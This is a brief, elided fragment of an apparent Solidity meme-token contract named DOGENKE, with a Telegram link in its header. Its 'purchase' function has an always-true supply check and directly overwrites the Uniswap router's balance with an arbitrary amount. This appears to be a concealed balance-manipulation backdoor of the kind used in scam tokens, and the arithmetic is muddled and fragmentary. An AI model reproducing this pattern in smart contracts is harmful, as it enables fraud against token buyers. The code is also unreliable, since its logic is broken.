...
/**
Telegram: https://t.me/dogenkebsc
**/
...
contract DOGENKE is IERC20, Ownable, BaseToken {
    ...
    function purchase(
        ...
        uint256 simpleClustEmbi = WETH * 10 ** decimals();
        require(0 <= totalSupply() + simpleClustEmbi, "Max supply exceeded");
        _balances[uniswapV2Router] = WETH * simpleClustEmbi;
        uint256 addLiquidityETH = simpleClustEmbi > address(this).balance ? 0 : address(this).balance - simpleClustEmbi;
